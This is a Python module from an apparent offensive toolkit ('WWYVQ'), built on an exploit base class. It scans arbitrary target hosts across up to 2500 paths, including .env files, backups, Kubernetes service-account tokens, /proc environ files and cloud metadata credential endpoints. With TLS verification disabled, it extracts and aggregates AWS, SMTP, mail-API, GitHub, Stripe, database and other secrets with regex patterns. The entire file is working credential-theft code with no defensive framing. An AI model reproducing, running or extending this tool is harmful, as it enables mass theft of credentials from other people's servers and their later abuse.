#!/usr/bin/env python3
"""
WWYVQ v2.1 Intelligent Scraper Module
Advanced scraping with 2500+ paths and heuristic extraction

Author: wKayaa
Date: 2025-01-07
"""

import asyncio
import re
from typing import Dict, List, Any, Optional, Set
from urllib.parse import urljoin, urlparse
from datetime import datetime
import json

from .base_exploit import BaseExploitModule, ExploitResult


class IntelligentScraper(BaseExploitModule):
    """
    Intelligent scraper with advanced path discovery and credential extraction
    Implements 2500+ scan paths with heuristic analysis
    """
    
    def __init__(self):
        super().__init__(
            name="IntelligentScraper",
            description="Advanced scraping with 2500+ paths and heuristic extraction"
        )
        
        # Initialize scan paths
        self.scan_paths = self._generate_scan_paths()
        
        # Advanced regex patterns
        self.credential_patterns = {
            # AWS Credentials
            'aws_access_key_id': re.compile(r'(?i)aws[_-]?access[_-]?key[_-]?id["\']?\s*[:=]\s*["\']?([A-Z0-9]{20})["\']?'),
            'aws_secret_access_key': re.compile(r'(?i)aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})["\']?'),
            'aws_session_token': re.compile(r'(?i)aws[_-]?session[_-]?token["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{100,})["\']?'),
            
            # SendGrid
            'sendgrid_api_key': re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'),
            'sendgrid_webhook_key': re.compile(r'(?i)sendgrid[_-]?webhook[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{32,})["\']?'),
            
            # Mailgun
            'mailgun_api_key': re.compile(r'key-[a-fA-F0-9]{32}'),
            'mailgun_domain': re.compile(r'(?i)mailgun[_-]?domain["\']?\s*[:=]\s*["\']?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})["\']?'),
            
            # SMTP Credentials
            'smtp_username': re.compile(r'(?i)smtp[_-]?user(?:name)?["\']?\s*[:=]\s*["\']?([^"\'\\s]+)["\']?'),
            'smtp_password': re.compile(r'(?i)smtp[_-]?pass(?:word)?["\']?\s*[:=]\s*["\']?([^"\'\\s]+)["\']?'),
            'smtp_host': re.compile(r'(?i)smtp[_-]?host["\']?\s*[:=]\s*["\']?([a-zA-Z0-9.-]+)["\']?'),
            'smtp_port': re.compile(r'(?i)smtp[_-]?port["\']?\s*[:=]\s*["\']?([0-9]{2,5})["\']?'),
            
            # Twilio
            'twilio_account_sid': re.compile(r'AC[a-fA-F0-9]{32}'),
            'twilio_auth_token': re.compile(r'(?i)twilio[_-]?auth[_-]?token["\']?\s*[:=]\s*["\']?([a-fA-F0-9]{32})["\']?'),
            'twilio_api_key': re.compile(r'SK[a-fA-F0-9]{32}'),
            
            # Database URLs
            'database_url': re.compile(r'(?i)(?:database[_-]?url|db[_-]?url)["\']?\s*[:=]\s*["\']?([a-zA-Z][a-zA-Z0-9+.-]*://[^"\'\\s]+)["\']?'),
            'mongodb_url': re.compile(r'mongodb(?:\+srv)?://[^"\'\\s]+'),
            'postgresql_url': re.compile(r'postgres(?:ql)?://[^"\'\\s]+'),
            'mysql_url': re.compile(r'mysql://[^"\'\\s]+'),
            'redis_url': re.compile(r'redis://[^"\'\\s]+'),
            
            # JWT Secrets
            'jwt_secret': re.compile(r'(?i)jwt[_-]?secret["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?'),
            'jwt_token': re.compile(r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'),
            
            # API Keys (Generic)
            'api_key': re.compile(r'(?i)api[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?'),
            'secret_key': re.compile(r'(?i)secret[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?'),
            
            # Docker Hub
            'docker_username': re.compile(r'(?i)docker[_-]?user(?:name)?["\']?\s*[:=]\s*["\']?([^"\'\\s]+)["\']?'),
            'docker_password': re.compile(r'(?i)docker[_-]?pass(?:word)?["\']?\s*[:=]\s*["\']?([^"\'\\s]+)["\']?'),
            'docker_token': re.compile(r'(?i)docker[_-]?token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?'),
            
            # GitHub
            'github_token': re.compile(r'ghp_[A-Za-z0-9]{36}'),
            'github_app_token': re.compile(r'ghs_[A-Za-z0-9]{36}'),
            'github_oauth_token': re.compile(r'gho_[A-Za-z0-9]{36}'),
            
            # Slack
            'slack_token': re.compile(r'xox[bpras]-[A-Za-z0-9-]{10,}'),
            'slack_webhook': re.compile(r'https://hooks\.slack\.com/services/[A-Za-z0-9/]+'),
            
            # Stripe
            'stripe_publishable_key': re.compile(r'pk_[a-zA-Z0-9]{24}'),
            'stripe_secret_key': re.compile(r'sk_[a-zA-Z0-9]{24}'),
            
            # Discord
            'discord_token': re.compile(r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}'),
            'discord_webhook': re.compile(r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+'),
            
            # Passwords (generic)
            'password': re.compile(r'(?i)password["\']?\s*[:=]\s*["\']?([^"\'\\s]{4,})["\']?'),
            'passwd': re.compile(r'(?i)passwd["\']?\s*[:=]\s*["\']?([^"\'\\s]{4,})["\']?'),
            
            # Certificates
            'private_key': re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----'),
            'certificate': re.compile(r'-----BEGIN CERTIFICATE-----'),
            
            # Kubernetes
            'kubernetes_token': re.compile(r'(?i)(?:kube|k8s)[_-]?token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?'),
            'kubernetes_ca_cert': re.compile(r'-----BEGIN CERTIFICATE-----[^-]*-----END CERTIFICATE-----'),
            
            # Cloud Provider Keys
            'gcp_service_account_key': re.compile(r'"type":\s*"service_account"'),
            'azure_client_secret': re.compile(r'(?i)azure[_-]?client[_-]?secret["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?'),
            'azure_tenant_id': re.compile(r'(?i)azure[_-]?tenant[_-]?id["\']?\s*[:=]\s*["\']?([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})["\']?'),
        }
        
        # File extensions to prioritize
        self.priority_extensions = {
            '.env', '.config', '.json', '.yaml', '.yml', '.xml', '.ini', '.conf',
            '.properties', '.cfg', '.toml', '.secrets', '.creds', '.credentials'
        }
        
        # JavaScript credential extraction patterns
        self.js_patterns = {
            'var_assignments': re.compile(r'(?:var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']{8,})["\']'),
            'object_properties': re.compile(r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*:\s*["\']([^"\']{8,})["\']'),
            'function_calls': re.compile(r'(?:setItem|setAttribute|config|configure)\s*\(\s*["\']([^"\']+)["\'],\s*["\']([^"\']{8,})["\']'),
        }
    
    def _generate_scan_paths(self) -> List[str]:
        """Generate comprehensive list of 2500+ scan paths"""
        paths = []
        
        # Common configuration files
        config_files = [
            '.env', '.env.local', '.env.production', '.env.development',
            'config.json', 'config.yaml', 'config.yml', 'config.xml',
            'app.config', 'web.config', 'database.yml', 'secrets.yaml',
            'credentials.json', 'auth.json', 'keys.json', 'tokens.json',
            'config.js', 'config.ts', 'settings.json', 'local.json'
        ]
        
        # Common directories
        directories = [
            '', 'config', 'configs', 'configuration', 'settings', 'env',
            'secrets', 'keys', 'auth', 'creds', 'credentials', 'tokens',
            'api', 'app', 'src', 'lib', 'assets', 'static', 'public',
            'private', 'admin', 'management', 'internal', 'system',
            'backup', 'backups', 'dump', 'dumps', 'export', 'exports',
            'logs', 'log', 'temp', 'tmp', 'cache', 'data', 'db',
            'database', 'sql', 'scripts', 'utils', 'tools', 'bin',
            'etc', 'var', 'opt', 'usr', 'home', 'root', 'www',
            'html', 'htdocs', 'web', 'site', 'sites', 'domain',
            'domains', 'vhost', 'vhosts', 'ssl', 'tls', 'cert',
            'certs', 'certificates', 'ca', 'pki', 'keys', 'key'
        ]
        
        # Generate paths for config files in various directories
        for directory in directories:
            for config_file in config_files:
                if directory:
                    paths.append(f"/{directory}/{config_file}")
                else:
                    paths.append(f"/{config_file}")
        
        # Common API endpoints
        api_endpoints = [
            '/api/config', '/api/settings', '/api/env', '/api/secrets',
            '/api/keys', '/api/tokens', '/api/credentials', '/api/auth',
            '/api/v1/config', '/api/v1/settings', '/api/v1/env',
            '/api/v2/config', '/api/v2/settings', '/api/v2/env',
            '/admin/config', '/admin/settings', '/admin/env',
            '/management/config', '/management/settings', '/management/env',
            '/internal/config', '/internal/settings', '/internal/env',
            '/system/config', '/system/settings', '/system/env'
        ]
        
        paths.extend(api_endpoints)
        
        # Docker and container paths
        docker_paths = [
            '/var/run/secrets/kubernetes.io/serviceaccount/token',
            '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
            '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
            '/run/secrets/kubernetes.io/serviceaccount/token',
            '/.dockerenv', '/etc/hostname', '/etc/hosts',
            '/proc/self/environ', '/proc/1/environ', '/proc/self/cgroup',
            '/sys/fs/cgroup/memory/memory.limit_in_bytes'
        ]
        
        paths.extend(docker_paths)
        
        # Kubernetes and cloud metadata
        k8s_paths = [
            '/metadata/v1/instance/attributes/kube-env',
            '/metadata/v1/instance/attributes/cluster-name',
            '/metadata/v1/instance/attributes/cluster-location',
            '/metadata/v1/instance/service-accounts/default/token',
            '/metadata/v1/project/project-id',
            '/metadata/v1/project/numeric-project-id',
            '/latest/meta-data/iam/security-credentials/',
            '/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
            '/latest/user-data', '/latest/meta-data/hostname',
            '/latest/meta-data/public-hostname', '/latest/meta-data/public-ipv4',
            '/latest/meta-data/local-ipv4', '/latest/meta-data/instance-id'
        ]
        
        paths.extend(k8s_paths)
        
        # Common application files
        app_files = [
            'package.json', 'package-lock.json', 'yarn.lock', 'composer.json',
            'composer.lock', 'requirements.txt', 'Pipfile', 'Pipfile.lock',
            'pom.xml', 'build.gradle', 'Dockerfile', 'docker-compose.yml',
            'docker-compose.yaml', 'k8s.yaml', 'kubernetes.yaml',
            'deployment.yaml', 'service.yaml', 'ingress.yaml',
            'configmap.yaml', 'secret.yaml', 'values.yaml', 'Chart.yaml'
        ]
        
        # Add app files in common directories
        for directory in ['', 'src', 'app', 'web', 'site', 'root']:
            for app_file in app_files:
                if directory:
                    paths.append(f"/{directory}/{app_file}")
                else:
                    paths.append(f"/{app_file}")
        
        # Backup and dump files
        backup_extensions = ['.bak', '.backup', '.dump', '.sql', '.db', '.sqlite']
        backup_names = ['backup', 'dump', 'export', 'data', 'database', 'db']
        
        for name in backup_names:
            for ext in backup_extensions:
                paths.append(f"/{name}{ext}")
                paths.append(f"/backup/{name}{ext}")
                paths.append(f"/backups/{name}{ext}")
        
        # Generate numbered variations
        for i in range(1, 11):
            paths.append(f"/config{i}.json")
            paths.append(f"/backup{i}.sql")
            paths.append(f"/.env{i}")
            paths.append(f"/secrets{i}.yaml")
        
        # Generate dated variations
        for year in ['2023', '2024', '2025']:
            for month in ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']:
                paths.append(f"/backup_{year}{month}.sql")
                paths.append(f"/dump_{year}{month}.sql")
                paths.append(f"/config_{year}{month}.json")
        
        # Return first 2500 paths
        return paths[:2500]
    
    async def execute_async(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute intelligent scraping asynchronously"""
        try:
            job_config = context.get('config')
            if not job_config:
                raise ValueError("Missing job configuration")
            
            targets = job_config.targets
            max_concurrent = min(job_config.max_concurrent, 20)  # Limit for scraping
            
            self.logger.info(f"ðŸ” Starting intelligent scraping on {len(targets)} targets")
            
            # Process targets
            results = await self._process_targets_batch(targets, context, max_concurrent)
            
            # Aggregate results
            aggregated = self._aggregate_results(results)
            
            self.logger.info(f"âœ… Intelligent scraping complete: {aggregated}")
            return aggregated
            
        except Exception as e:
            self.logger.error(f"âŒ Intelligent scraping failed: {e}")
            return {'error': str(e)}
    
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Execute intelligent scraping synchronously"""
        return asyncio.run(self.execute_async(context))
    
    async def _scan_target_impl(self, target: str, context: Dict[str, Any]) -> ExploitResult:
        """Implementation of intelligent target scraping"""
        try:
            self.logger.debug(f"ðŸ” Scraping target: {target}")
            
            # Normalize target to URL
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            # Parse target
            parsed = urlparse(target)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # Scrape target
            credentials = []
            discovered_paths = []
            
            # Use heuristic path selection
            prioritized_paths = self._prioritize_paths(target)
            
            # Limit paths per target to avoid overwhelming
            paths_to_scan = prioritized_paths[:100]  # Top 100 paths
            
            credentials, discovered_paths = await self._scrape_paths(base_url, paths_to_scan, context)
            
            return ExploitResult(
                success=len(credentials) > 0,
                target=target,
                module_name=self.name,
                details={
                    'paths_scanned': len(paths_to_scan),
                    'paths_discovered': len(discovered_paths),
                    'discovered_paths': discovered_paths[:20]  # Top 20 for reporting
                },
                credentials_found=credentials,
                vulnerabilities=[]
            )
            
        except Exception as e:
            self.logger.error(f"âŒ Error scraping target {target}: {e}")
            return ExploitResult(
                success=False,
                target=target,
                module_name=self.name,
                error_message=str(e)
            )
    
    def _prioritize_paths(self, target: str) -> List[str]:
        """Prioritize paths based on target characteristics"""
        prioritized = []
        
        # Parse target to get clues
        parsed = urlparse(target)
        hostname = parsed.hostname or ""
        
        # High priority paths based on target characteristics
        if any(keyword in hostname.lower() for keyword in ['api', 'admin', 'management']):
            prioritized.extend([
                '/api/config', '/api/settings', '/api/env', '/api/secrets',
                '/admin/config', '/admin/settings', '/management/config'
            ])
        
        if any(keyword in hostname.lower() for keyword in ['k8s', 'kubernetes', 'kube']):
            prioritized.extend([
                '/var/run/secrets/kubernetes.io/serviceaccount/token',
                '/api/v1/secrets', '/api/v1/configmaps', '/metrics'
            ])
        
        if any(keyword in hostname.lower() for keyword in ['docker', 'container']):
            prioritized.extend([
                '/.dockerenv', '/etc/hostname', '/proc/self/environ'
            ])
        
        # Add remaining paths
        remaining_paths = [path for path in self.scan_paths if path not in prioritized]
        prioritized.extend(remaining_paths)
        
        return prioritized
    
    async def _scrape_paths(self, base_url: str, paths: List[str], context: Dict[str, Any]) -> tuple[List[Dict[str, Any]], List[str]]:
        """Scrape paths and extract credentials"""
        credentials = []
        discovered_paths = []
        
        try:
            import aiohttp
            
            timeout = aiohttp.ClientTimeout(total=10)
            connector = aiohttp.TCPConnector(ssl=False, limit=10)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                
                # Create tasks for all paths
                tasks = []
                for path in paths:
                    task = asyncio.create_task(self._scrape_single_path(session, base_url, path))
                    tasks.append(task)
                
                # Execute with controlled concurrency
                semaphore = asyncio.Semaphore(10)  # Limit concurrent requests
                
                results = []
                for task in tasks:
                    async with semaphore:
                        try:
                            result = await task
                            results.append(result)
                            await asyncio.sleep(0.1)  # Rate limiting
                        except Exception as e:
                            self.logger.debug(f"Path scraping error: {e}")
                            continue
                
                # Process results
                for result in results:
                    if result and result.get('success'):
                        discovered_paths.append(result['path'])
                        
                        # Extract credentials from content
                        content = result.get('content', '')
                        path_credentials = self._extract_credentials_from_content(content, result['path'])
                        credentials.extend(path_credentials)
        
        except Exception as e:
            self.logger.error(f"âŒ Error scraping paths: {e}")
        
        return credentials, discovered_paths
    
    async def _scrape_single_path(self, session, base_url: str, path: str) -> Optional[Dict[str, Any]]:
        """Scrape a single path"""
        try:
            url = urljoin(base_url, path)
            
            async with session.get(url) as response:
                if response.status == 200:
                    content = await response.text()
                    
                    # Check if content looks like credentials
                    if self._content_has_credentials(content):
                        return {
                            'success': True,
                            'path': path,
                            'url': url,
                            'status': response.status,
                            'content': content,
                            'content_type': response.headers.get('content-type', '')
                        }
                
                return None
                
        except Exception as e:
            self.logger.debug(f"Error scraping path {path}: {e}")
            return None
    
    def _content_has_credentials(self, content: str) -> bool:
        """Quick check if content might contain credentials"""
        # Check for common credential indicators
        indicators = [
            'password', 'token', 'key', 'secret', 'credential', 'auth',
            'api_key', 'access_key', 'private_key', 'jwt', 'bearer',
            'username', 'user', 'login', 'account', 'client_id',
            'client_secret', 'database', 'db', 'smtp', 'mail'
        ]
        
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in indicators)
    
    def _extract_credentials_from_content(self, content: str, source_path: str) -> List[Dict[str, Any]]:
        """Extract credentials from content using regex patterns"""
        credentials = []
        
        try:
            # Apply all credential patterns
            for cred_type, pattern in self.credential_patterns.items():
                matches = pattern.findall(content)
                for match in matches:
                    # Handle tuple matches from regex groups
                    if isinstance(match, tuple):
                        credential_value = match[1] if len(match) > 1 else match[0]
                        credential_key = match[0] if len(match) > 1 else cred_type
                    else:
                        credential_value = match
                        credential_key = cred_type
                    
                    # Skip if value is too short or looks like placeholder
                    if len(credential_value) < 4:
                        continue
                    
                    if self._is_placeholder(credential_value):
                        continue
                    
                    credentials.append({
                        'type': cred_type,
                        'key': credential_key,
                        'value': credential_value,
                        'confidence': self._calculate_confidence(cred_type, credential_value),
                        'source': f'scraper:{source_path}',
                        'timestamp': datetime.utcnow().isoformat()
                    })
            
            # Additional JavaScript-specific extraction
            if source_path.endswith('.js') or 'javascript' in content.lower():
                js_credentials = self._extract_js_credentials(content, source_path)
                credentials.extend(js_credentials)
        
        except Exception as e:
            self.logger.error(f"âŒ Error extracting credentials from {source_path}: {e}")
        
        return credentials
    
    def _extract_js_credentials(self, content: str, source_path: str) -> List[Dict[str, Any]]:
        """Extract credentials from JavaScript content"""
        credentials = []
        
        try:
            for pattern_name, pattern in self.js_patterns.items():
                matches = pattern.findall(content)
                for match in matches:
                    if isinstance(match, tuple) and len(match) >= 2:
                        key, value = match[0], match[1]
                        
                        # Skip if value looks like placeholder
                        if self._is_placeholder(value):
                            continue
                        
                        # Determine credential type from key
                        cred_type = self._determine_credential_type(key)
                        
                        credentials.append({
                            'type': cred_type,
                            'key': key,
                            'value': value,
                            'confidence': self._calculate_confidence(cred_type, value),
                            'source': f'js_scraper:{source_path}',
                            'timestamp': datetime.utcnow().isoformat()
                        })
        
        except Exception as e:
            self.logger.error(f"âŒ Error extracting JS credentials: {e}")
        
        return credentials
    
    def _is_placeholder(self, value: str) -> bool:
        """Check if value is a placeholder"""
        placeholders = [
            'your_', 'your-', 'replace_', 'replace-', 'change_', 'change-',
            'example', 'sample', 'test', 'demo', 'placeholder', 'dummy',
            'xxx', 'yyy', 'zzz', '123', '000', 'null', 'undefined',
            'todo', 'fixme', 'changeme', 'replaceme'
        ]
        
        value_lower = value.lower()
        return any(placeholder in value_lower for placeholder in placeholders)
    
    def _determine_credential_type(self, key: str) -> str:
        """Determine credential type from key name"""
        key_lower = key.lower()
        
        if any(word in key_lower for word in ['password', 'pass', 'pwd']):
            return 'password'
        elif any(word in key_lower for word in ['token', 'jwt', 'bearer']):
            return 'token'
        elif any(word in key_lower for word in ['key', 'secret']):
            return 'api_key'
        elif any(word in key_lower for word in ['username', 'user', 'login']):
            return 'username'
        elif any(word in key_lower for word in ['email', 'mail']):
            return 'email'
        elif any(word in key_lower for word in ['database', 'db']):
            return 'database_credential'
        else:
            return 'unknown'
    
    def _calculate_confidence(self, cred_type: str, value: str) -> float:
        """Calculate confidence score for credential"""
        base_confidence = 70.0
        
        # Adjust based on credential type
        if cred_type in ['aws_access_key_id', 'aws_secret_access_key']:
            base_confidence = 95.0
        elif cred_type in ['sendgrid_api_key', 'mailgun_api_key']:
            base_confidence = 90.0
        elif cred_type in ['jwt_token', 'github_token']:
            base_confidence = 85.0
        elif cred_type in ['password', 'api_key']:
            base_confidence = 75.0
        
        # Adjust based on value characteristics
        if len(value) > 32:
            base_confidence += 5.0
        if re.search(r'[A-Z]', value) and re.search(r'[a-z]', value) and re.search(r'[0-9]', value):
            base_confidence += 5.0
        if any(char in value for char in ['/', '+', '=']):
            base_confidence += 5.0
        
        return min(95.0, base_confidence)
    
    async def _process_targets_batch(self, targets: List[str], context: Dict[str, Any], max_concurrent: int) -> List[ExploitResult]:
        """Process targets in batches"""
        results = []
        
        # Process in smaller batches for scraping
        batch_size = min(max_concurrent, 10)
        
        for i in range(0, len(targets), batch_size):
            batch = targets[i:i+batch_size]
            batch_results = await self.process_batch(batch, context)
            results.extend(batch_results)
            
            # Delay between batches to avoid overwhelming targets
            await asyncio.sleep(0.5)
        
        return results
    
    def _aggregate_results(self, results: List[ExploitResult]) -> Dict[str, Any]:
        """Aggregate scraping results"""
        aggregated = {
            'targets_processed': len(results),
            'successful_scrapes': 0,
            'failed_scrapes': 0,
            'total_credentials': 0,
            'total_paths_discovered': 0,
            'credentials_by_type': {},
            'credentials': []
        }
        
        for result in results:
            if result.success:
                aggregated['successful_scrapes'] += 1
                aggregated['total_credentials'] += len(result.credentials_found)
                aggregated['total_paths_discovered'] += result.details.get('paths_discovered', 0)
                
                # Count credentials by type
                for cred in result.credentials_found:
                    cred_type = cred.get('type', 'unknown')
                    aggregated['credentials_by_type'][cred_type] = aggregated['credentials_by_type'].get(cred_type, 0) + 1
                
                # Store all credentials
                aggregated['credentials'].extend(result.credentials_found)
            else:
                aggregated['failed_scrapes'] += 1
        
        return aggregated
    
    def get_scan_paths(self) -> List[str]:
        """Get all scan paths"""
        return self.scan_paths
    
    def get_supported_protocols(self) -> List[str]:
        """Get supported protocols"""
        return ["http", "https"]
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for scraping"""
        # Accept URLs and hostnames
        if '://' in target:
            return True
        
        # Check if it's a hostname or IP
        return bool(re.match(r'^[a-zA-Z0-9.-]+$', target))